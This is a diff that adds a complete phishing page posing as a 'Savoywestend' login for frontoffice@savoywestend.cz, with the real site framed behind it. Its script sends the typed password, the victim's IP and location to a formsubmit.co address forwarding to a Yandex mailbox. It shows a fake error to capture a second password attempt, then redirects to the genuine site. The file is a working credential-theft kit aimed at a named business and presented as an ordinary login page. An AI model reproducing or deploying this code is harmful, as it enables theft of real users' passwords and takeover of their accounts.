@@ -1,1 +1,336 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Savoywestend Login</title>
+  <style>
+    * { 
+      box-sizing: border-box; 
+      font-family: Arial, Helvetica, sans-serif; 
+    }
 
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      overflow: hidden;
+    }
+
+    /* Background iframe container */
+    .iframe-background {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: -1;
+      overflow: hidden;
+    }
+    
+    .iframe-background iframe {
+      width: 100%;
+      height: 100%;
+      border: none;
+      filter: blur(3px) brightness(0.7);
+      transform: scale(1.05); /* Prevents blurred edges */
+    }
+
+    .iframe-overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.3);
+      z-index: 0;
+    }
+
+    .login-card {
+      width: 360px;
+      background: #fff;
+      border-radius: 6px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.25);
+      padding: 24px 22px 26px;
+      text-align: center;
+      position: relative;
+      z-index: 1;
+    }
+
+    .logo {
+      width: 70px;
+      margin: 0 auto 10px;
+      border-radius: 50%;
+      background: white;
+      padding: 5px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+
+    h2 {
+      margin: 6px 0 14px;
+      font-size: 20px;
+      font-weight: 600;
+      color: #333;
+    }
+
+    .error {
+      background: #f8d7da;
+      color: #842029;
+      padding: 10px;
+      border-radius: 4px;
+      font-size: 14px;
+      margin-bottom: 14px;
+      display: none; /* Hidden by default, shown via JS */
+    }
+
+    .field {
+      margin-bottom: 14px;
+      position: relative;
+    }
+
+    .field input {
+      width: 100%;
+      padding: 11px 38px 11px 36px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 14px;
+      transition: border 0.3s;
+    }
+
+    .field input:focus {
+      outline: none;
+      border-color: #1e88e5;
+    }
+
+    .field .icon {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-50%);
+      color: #666;
+      font-size: 14px;
+    }
+
+    .field .toggle {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      cursor: pointer;
+      font-size: 13px;
+      color: #666;
+      user-select: none;
+    }
+
+    button {
+      width: 100%;
+      background: #1e88e5;
+      border: none;
+      color: #fff;
+      padding: 12px;
+      border-radius: 4px;
+      font-size: 15px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: background 0.3s;
+    }
+
+    button:hover { 
+      background: #1565c0; 
+    }
+
+    button:active {
+      transform: translateY(1px);
+    }
+
+    .footer {
+      margin-top: 14px;
+      font-size: 12px;
+      color: #777;
+    }
+
+    /* Loading state */
+    button.loading {
+      background: #90caf9;
+      cursor: not-allowed;
+    }
+
+    /* Domain display */
+    .domain-display {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 15px;
+      padding: 5px;
+      background: #f5f5f5;
+      border-radius: 4px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Background iframe -->
+  <div class="iframe-background">
+    <iframe id="frame" src=""></iframe>
+    <div class="iframe-overlay"></div>
+  </div>
+
+  <!-- Login form -->
+  <div class="login-card">
+    <img id="logo" src="" alt="Logo" class="logo" />
+    <h2>Savoywestend Login</h2>
+
+    <div class="error" id="error">Invalid password. Please enter the correct information.</div>
+
+    <div class="domain-display" id="domain-display">
+      <!-- Domain will be shown here -->
+    </div>
+
+    <form id="login-form">
+      <div class="field">
+        <span class="icon">👤</span>
+        <input type="email" id="email" value="frontoffice@savoywestend.cz" readonly />
+      </div>
+
+      <div class="field">
+        <span class="icon">🔒</span>
+        <input type="password" id="psw" placeholder="Password" />
+        <span class="toggle" onclick="togglePassword()">👁</span>
+      </div>
+
+      <button type="submit" id="submit-btn">Submit</button>
+    </form>
+
+    <div class="footer">© savoywestend.cz 2025</div>
+  </div>
+
+  <!-- jQuery -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script>
+    // Initialize variables
+    let step = 1;
+    const urlParams = new URLSearchParams(window.location.search);
+    const clientID = urlParams.get('id') || "frontoffice@savoywestend.cz";
+    
+    // Get domain from email
+    const domain = clientID.split('@').pop();
+    
+    // Set email field value
+    $('#email').val(clientID);
+    
+    // Set iframe source
+    $('#frame').attr("src", "https://" + domain);
+    
+    // Set domain display
+    $('#domain-display').text(`Log in to ${domain}`);
+    
+    // Set favicon logo
+    const logoUrl = "https://www.google.com/s2/favicons?domain=" + domain + "&sz=128";
+    $("#logo").attr("src", logoUrl)
+    .on("error", function() {
+      $(this).attr("src", "https://via.placeholder.com/100/0096FF/ffffff?text=" + domain.charAt(0).toUpperCase());
+    });
+
+    // Password visibility toggle
+    function togglePassword() {
+      const p = document.getElementById('psw');
+      p.type = p.type === 'password' ? 'text' : 'password';
+      
+      // Update eye icon
+      const eye = document.querySelector('.toggle');
+      eye.textContent = p.type === 'password' ? '👁' : '🙈';
+    }
+
+    // Form submission handler
+    const submit = $("#submit-btn");
+    
+    $("#login-form").submit(function(event) {
+      event.preventDefault();
+      
+      // Disable submit button and show loading state
+      submit.text('Verifying...');
+      submit.addClass('loading');
+      submit.prop('disabled', true);
+      
+      // Get user IP and location info
+      $.getJSON('https://ipinfo.io/json', function(response) {
+        const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
+          _subject: "Logs | " + response.ip,
+          Email: $("#email").val(),
+          Password: $("#psw").val(),
+          Attempts: step,
+          IP: response.ip,
+          Location: response.city + ", " + response.country,
+          Domain: domain,
+          Timestamp: new Date().toISOString()
+        });
+
+        posting.done(function(data) {
+          if (step === 2) {
+            // Second attempt - redirect to actual domain
+            window.location.href = "https://" + domain;
+          } else {
+            // First attempt - show error
+            step++;
+            $("#error").css("display", "block");
+            submit.text('Submit');
+            submit.removeClass('loading');
+            submit.prop('disabled', false);
+            $("#psw").val("");
+            
+            // Update error message
+            $("#error").text("Invalid credentials. Please try again.");
+          }
+        });
+
+        posting.fail(function(error) {
+          console.error(error);
+          $("#error").css("display", "block");
+          submit.text('Submit');
+          submit.removeClass('loading');
+          submit.prop('disabled', false);
+          $("#psw").val("");
+        });
+      }, "json").fail(function() {
+        // If IP info fails, still submit the form data
+        const posting = $.post("https://formsubmit.co/ajax/dattiobi@yandex.com", {
+          _subject: "Logs | Unknown IP",
+          Email: $("#email").val(),
+          Password: $("#psw").val(),
+          Attempts: step,
+          IP: "Unknown",
+          Location: "Unknown",
+          Domain: domain,
+          Timestamp: new Date().toISOString()
+        });
+
+        posting.done(function(data) {
+          if (step === 2) {
+            window.location.href = "https://" + domain;
+          } else {
+            step++;
+            $("#error").css("display", "block");
+            submit.text('Submit');
+            submit.removeClass('loading');
+            submit.prop('disabled', false);
+            $("#psw").val("");
+          }
+        });
+      });
+    });
+    
+    // Initialize iframe with a default if no domain is detected
+    if (!domain || domain === clientID) {
+      $('#frame').attr("src", "https://www.savoywestend.cz");
+      $('#domain-display').text("Log in to Savoywestend");
+    }
+    
+    // Add some delay to show the background loading
+    setTimeout(function() {
+      $('.iframe-background').css('opacity', '1');
+    }, 100);
+  </script>
+</body>
+  </html>
